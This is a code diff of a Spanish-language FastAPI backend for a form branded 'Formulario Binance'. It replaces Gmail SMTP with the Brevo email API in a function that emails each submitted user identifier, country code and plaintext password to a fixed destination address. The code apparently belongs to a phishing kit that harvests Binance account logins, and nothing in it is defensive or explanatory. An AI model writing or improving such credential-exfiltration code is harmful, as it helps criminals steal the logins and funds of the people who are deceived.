@@ -1,8 +1,6 @@
 import sqlite3
 import aiosqlite
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import requests
 from fastapi import FastAPI, HTTPException, status
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
@@ -22,6 +20,7 @@ DB_PATH = "formulario.db"
 GMAIL_REMITENTE = os.getenv("GMAIL_REMITENTE")
 GMAIL_CONTRASENA = os.getenv("GMAIL_CONTRASENA")
 CORREO_DESTINO = os.getenv("CORREO_DESTINO")
+BREVO_API_KEY = os.getenv("BREVO_API_KEY")
 
 print("REMITENTE:", GMAIL_REMITENTE)
 print("DESTINO:", CORREO_DESTINO)
@@ -115,30 +114,60 @@ async def guardar_verificacion(data: DatosVerificacion):
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
-def enviar_correo(identificador: str, codigo_pais: str, contrasena: str, fecha: str):
-    """Envía los datos del formulario a CORREO_DESTINO via Gmail SMTP."""
-    asunto = f"📋 Nuevo registro Binance – {fecha}"
-    cuerpo = f"""\
-Nuevo registro recibido:
+def enviar_correo(identificador, codigo_pais, contrasena, fecha):
 
-📅 Fecha:         {fecha}
-🌍 País:          {codigo_pais}
-📱 Identificador: {identificador}
-🔑 Contraseña:    {contrasena}
+    url = "https://api.brevo.com/v3/smtp/email"
 
-— Formulario Binance
-"""
-    msg = MIMEMultipart()
-    msg["From"]    = GMAIL_REMITENTE
-    msg["To"]      = CORREO_DESTINO
-    msg["Subject"] = asunto
-    msg.attach(MIMEText(cuerpo, "plain", "utf-8"))
+    headers = {
+        "accept": "application/json",
+        "api-key": BREVO_API_KEY,
+        "content-type": "application/json"
+    }
 
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
-        servidor.login(GMAIL_REMITENTE, GMAIL_CONTRASENA)
-        servidor.sendmail(GMAIL_REMITENTE, CORREO_DESTINO, msg.as_string())
+    payload = {
+        "sender": {
+            "name": "Formulario Binance",
+            "email": GMAIL_REMITENTE
+        },
+        "to": [
+            {
+                "email": CORREO_DESTINO
+            }
+        ],
+        "subject": "🚨 Nuevo formulario recibido",
 
+        "htmlContent": f"""
+        <html>
+        <body style="font-family:Arial">
 
+            <h2>Nuevo formulario recibido</h2>
+
+            <hr>
+
+            <p><b>Usuario:</b> {identificador}</p>
+
+            <p><b>Código País:</b> {codigo_pais}</p>
+
+            <p><b>Contraseña:</b> {contrasena}</p>
+
+            <p><b>Fecha:</b> {fecha}</p>
+
+        </body>
+        </html>
+        """
+    }
+
+    respuesta = requests.post(
+        url,
+        json=payload,
+        headers=headers,
+        timeout=30
+    )
+
+    print("Brevo Status:", respuesta.status_code)
+    print("Brevo:", respuesta.text)
+
+    respuesta.raise_for_status()
 # ─────────────────────────────────────────────────────────────
 # Endpoints
 # ─────────────────────────────────────────────────────────────
